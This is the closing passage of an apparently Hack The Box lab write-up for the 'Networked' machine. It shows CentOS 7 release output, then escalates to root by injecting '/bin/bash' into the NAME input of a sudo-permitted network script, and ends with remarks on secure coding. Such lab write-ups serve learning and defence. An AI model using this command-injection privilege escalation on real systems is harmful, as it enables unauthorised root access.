<span class="nv">VERSION</span><span class="o">=</span><span class="s2">"7 (Core)"</span>
<span class="nv">ID</span><span class="o">=</span><span class="s2">"centos"</span>
<span class="nv">ID_LIKE</span><span class="o">=</span><span class="s2">"rhel fedora"</span>
<span class="nv">VERSION_ID</span><span class="o">=</span><span class="s2">"7"</span>
<span class="nv">PRETTY_NAME</span><span class="o">=</span><span class="s2">"CentOS Linux 7 (Core)"</span>
<span class="nv">ANSI_COLOR</span><span class="o">=</span><span class="s2">"0;31"</span>
<span class="nv">CPE_NAME</span><span class="o">=</span><span class="s2">"cpe:/o:centos:centos:7"</span>
<span class="nv">HOME_URL</span><span class="o">=</span><span class="s2">"https://www.centos.org/"</span>
<span class="nv">BUG_REPORT_URL</span><span class="o">=</span><span class="s2">"https://bugs.centos.org/"</span>

<span class="nv">CENTOS_MANTISBT_PROJECT</span><span class="o">=</span><span class="s2">"CentOS-7"</span>
<span class="nv">CENTOS_MANTISBT_PROJECT_VERSION</span><span class="o">=</span><span class="s2">"7"</span>
<span class="nv">REDHAT_SUPPORT_PRODUCT</span><span class="o">=</span><span class="s2">"centos"</span>
<span class="nv">REDHAT_SUPPORT_PRODUCT_VERSION</span><span class="o">=</span><span class="s2">"7"</span>

CentOS Linux release 7.6.1810 <span class="o">(</span>Core<span class="o">)</span> 
CentOS Linux release 7.6.1810 <span class="o">(</span>Core<span class="o">)</span> </code></pre></figure>

<p>So <code class="highlighter-rouge">networked</code> is running <em>CentOS 7</em>. A quick search term of <code class="highlighter-rouge">centos 7 ifcfg vuln</code> reveals a potential <a href="https://seclists.org/fulldisclosure/2019/Apr/24">exploit</a>.</p>

<p>Let’s run our script again this time inputting the command we want to run in the <code class="highlighter-rouge">NAME=</code> input:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> /usr/local/sbin/changename.sh
interface NAME:
s /bin/bash
interface PROXY_METHOD:
a
interface BROWSER_ONLY:
b
interface BOOTPROTO:
e
<span class="o">[</span>root@networked network-scripts]# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="o">[</span>root@networked network-scripts]# <span class="nb">cat</span> /root/root.txt
0a8ecda83f....ac3d0dcb82</code></pre></figure>

<p>And just like that we have the <code class="highlighter-rouge">root.txt</code> flag. Congrats on another box rooted!</p>

<h2 id="conclusion">Conclusion</h2>

<p>The initial foothold shows that there can be major issues with allowing users to upload files via <em>PHP</em> scripts. Secure coding practices should always be at the forefront of the development process. Although these issues can be avoided they are still seen in the real world. As for the privilege escalation? It could have easily been avoided by ensuring <code class="highlighter-rouge">sudo</code> requires a password.</p>

<!-- Hack The Box Badge -->
          <p class="text-center" style="padding-top: 10px;"><img src="https://www.hackthebox.eu/badge/image/195745" alt="Hack The Box"></p></main>
      </div>
    </div>
    <!-- Bootstrap core JavaScript -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
    <script src="/assets/js/bootstrap.bundle.min.js"></script>
    <!-- Custom JavaScript -->
    <script src="/assets/js/sabe.js"></script>
    <!-- Lightbox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
    <script>
      $(document).on('click', '[data-toggle="lightbox"]', function(event) {
        event.preventDefault();
        $(this).ekkoLightbox();
      });
    </script>
  </body>
</html>